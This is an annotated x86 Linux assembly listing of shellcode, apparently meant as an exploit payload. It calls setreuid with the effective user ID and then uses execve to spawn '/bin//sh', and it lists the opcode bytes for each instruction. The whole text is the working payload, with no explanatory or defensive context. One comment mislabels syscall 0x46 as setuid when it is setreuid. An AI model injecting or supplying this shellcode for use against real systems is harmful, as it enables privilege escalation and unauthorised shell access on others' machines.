; setreuid(geteuid(), geteuid())
xor    eax, eax          ; \x31\xc0         ; eax = 0
mov    al, 0x31          ; \xb0\x31         ; systemcall number of geteuid()
int    0x80              ; \xcd\x80         ; systemcall
mov    ebx, eax          ; \x89\xc3         ; ebx = uid(first arg)
mov    ecx, eax          ; \x89\xc1         ; ecx = uid(second arg)
xor    eax, eax          ; \x31\xc0         ; eax = 0
mov    al, 0x46          ; \xb0\x46         ; systemcall number of setuid()
int    0x80              ; \xcd\x80         ; systemcall

; execve("/bin//sh", ["/bin//sh", NULL], NULL)
xor    eax, eax          ; \x31\xc0         ; EAX = 0
push   eax               ; \x50             ; push NULL (end of argv)
push   0x68732f2f        ; \x68\x2f\x2f\x73\x68 ; push "//sh"
push   0x6e69622f        ; \x68\x2f\x62\x69\x6e ; push "/bin"
mov    ebx, esp          ; \x89\xe3        ; ebx = ptr to "/bin//sh"
push   eax               ; \x50             ; push NULL (end of envp)
push   ebx               ; \x53             ; push pointer to "/bin//sh"
mov    ecx, esp          ; \x89\xe1         ; ECX = argv
mov    edx, eax          ; \x89\xc2         ; EDX = envp (NULL)
mov    al, 0x0b          ; \xb0\x0b         ; syscall number of execve
int    0x80              ; \xcd\x80         ; systemcall
